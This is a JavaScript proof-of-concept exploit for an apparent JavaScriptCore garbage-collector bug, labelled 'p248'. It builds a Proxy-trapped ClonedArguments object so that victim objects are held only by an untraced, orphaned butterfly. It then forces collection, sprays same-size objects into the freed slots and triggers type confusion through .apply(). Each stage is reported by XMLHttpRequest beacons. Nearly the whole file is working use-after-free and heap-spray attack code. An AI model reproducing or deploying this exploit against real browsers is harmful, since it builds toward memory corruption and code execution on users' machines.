// p248 - ClonedArguments butterfly type confusion via auxiliary cell non-tracing
//
// SlotVisitor::appendJSCellOrAuxiliary (line 202-220):
//   JSCell -> appendToMarkStack (traces children)
//   Auxiliary -> noteLiveAuxiliaryCell (ONLY marks cell, does NOT trace contents)
//
// Conservative GC pins the orphaned butterfly cell, but does NOT trace the
// JSValues stored inside it. If objects are referenced ONLY from the orphaned
// butterfly, GC will free them. Spray can then reclaim those slots.
//
// Indices 0,1 are already written to firstElementDest before the hole triggers.
// Those are on the stack and conservatively pinned. Target indices 3-7.
//
// Beacon prefix: V248-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var url = '/beacon/V248-' + tag + '?t=' + Date.now();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body).substring(0, 1200));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  B('BOOT');

  function attempt(round) {
    var sprayObjs = [];
    var weakRefs = [];

    // Step 1: Create victim objects externally
    var victims = [];
    for (var i = 0; i < 8; i++) {
      var obj = {victimTag: 0xBBBB0000 + i, idx: i, pad: i * 1111};
      victims.push(obj);
      weakRefs.push(new WeakRef(obj));
    }

    // Step 2: Create ClonedArguments with victims as arguments
    function mkClonedArgs() {
      delete arguments[2]; // hole at index 2

      var self = arguments;
      var hitTrap = false;

      Object.setPrototypeOf(arguments, new Proxy({}, {
        get: function(t, prop) {
          if (!hitTrap && prop === '2') {
            hitTrap = true;

            // Convert to ArrayStorage (orphans old butterfly)
            self[0x7fffffff] = 1;
            delete self[0x7fffffff];

            // Clear indices 3-7 from the NEW butterfly
            // Indices 0,1 are already in firstElementDest (pinned by stack)
            // Index 2 is the hole (already empty)
            // After clearing, victims 3-7 are ONLY in the old butterfly
            for (var ci = 3; ci < 8; ci++) {
              self[ci] = null;
            }

            B('R' + round + '-CLEARED');

            // Force GC to free victims 3-7
            // The old butterfly cell is pinned but its contents are NOT traced
            for (var g = 0; g < 40; g++) {
              var batch = new Array(8000);
              for (var k = 0; k < batch.length; k++) {
                batch[k] = {x: k, y: k * 2, z: [k]};
              }
              batch = null;
            }

            // Check WeakRefs
            var aliveCount = 0;
            var freedCount = 0;
            for (var wi = 3; wi < 8; wi++) {
              var wr = weakRefs[wi];
              if (wr && wr.deref() === undefined) {
                freedCount++;
              } else {
                aliveCount++;
              }
            }
            B('R' + round + '-WR-FREED' + freedCount + '-ALIVE' + aliveCount);

            if (freedCount > 0) {
              // Victims were freed! Spray to reclaim their MarkedBlock slots.
              // Use objects with same approximate cell size as victims.
              // Victim: {victimTag, idx, pad} = 3 inline props ~= 48-64 byte cell
              for (var s = 0; s < 10000; s++) {
                sprayObjs.push({
                  sprayTag: 0xCCCC0000 + s,
                  sIdx: s,
                  sPad: 0xDDDD0000 + round
                });
              }
              B('R' + round + '-SPRAYED-' + sprayObjs.length);
            } else {
              // More aggressive GC
              for (var g2 = 0; g2 < 30; g2++) {
                var batch2 = [];
                for (var k = 0; k < 10000; k++) {
                  batch2.push({a: k, b: [k]});
                }
                batch2 = null;
              }

              // Recheck
              freedCount = 0;
              for (var wi = 3; wi < 8; wi++) {
                if (weakRefs[wi] && weakRefs[wi].deref() === undefined) freedCount++;
              }
              B('R' + round + '-WR2-FREED' + freedCount);

              // Spray regardless
              for (var s = 0; s < 10000; s++) {
                sprayObjs.push({
                  sprayTag: 0xCCCC0000 + s,
                  sIdx: s,
                  sPad: 0xDDDD0000 + round
                });
              }
              B('R' + round + '-SPRAYED2-' + sprayObjs.length);
            }
          }
          return 0xBEEF;
        }
      }));

      return arguments;
    }

    var cloned = mkClonedArgs.apply(null, victims);

    // Drop all external refs to victims
    victims = null;

    // Step 3: Trigger copyToArguments via .apply()
    function collector() {
      var out = [];
      for (var i = 0; i < arguments.length; i++) {
        var arg = arguments[i];
        if (arg === null || arg === undefined) {
          out.push(i + '=NULL');
        } else if (typeof arg === 'object') {
          if ('sprayTag' in arg) {
            out.push(i + '=SPRAY:' + ((arg.sprayTag >>> 0).toString(16)));
          } else if ('victimTag' in arg) {
            out.push(i + '=VICTIM:' + ((arg.victimTag >>> 0).toString(16)));
          } else {
            var keys = Object.keys(arg).slice(0, 3).join(',');
            out.push(i + '=OBJ:' + keys);
          }
        } else if (typeof arg === 'number') {
          out.push(i + '=N:' + ((arg >>> 0).toString(16)));
        } else {
          out.push(i + '=T:' + typeof arg);
        }
      }
      return out;
    }

    var result;
    try {
      result = collector.apply(null, cloned);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 60));
      return;
    }

    if (!result) {
      B('R' + round + '-NO-RESULT');
      return;
    }

    B('R' + round + '-LEN-' + result.length);
    B('R' + round + '-VALS', result.join(' '));

    // Count types
    var victimHits = 0;
    var sprayHits = 0;
    var nullHits = 0;
    var otherHits = 0;
    for (var i = 0; i < result.length; i++) {
      var r = result[i];
      if (r.indexOf('SPRAY') >= 0) sprayHits++;
      else if (r.indexOf('VICTIM') >= 0) victimHits++;
      else if (r.indexOf('NULL') >= 0) nullHits++;
      else otherHits++;
    }
    B('R' + round + '-V' + victimHits + '-S' + sprayHits + '-N' + nullHits + '-O' + otherHits);

    if (sprayHits > 0) {
      B('R' + round + '-TYPE-CONFUSION-HIT');
    }
  }

  for (var r = 0; r < 5; r++) {
    try {
      attempt(r);
    } catch(e) {
      B('R' + r + '-CRASH-' + e.message.substring(0, 80));
    }
  }

  B('DONE');
})();
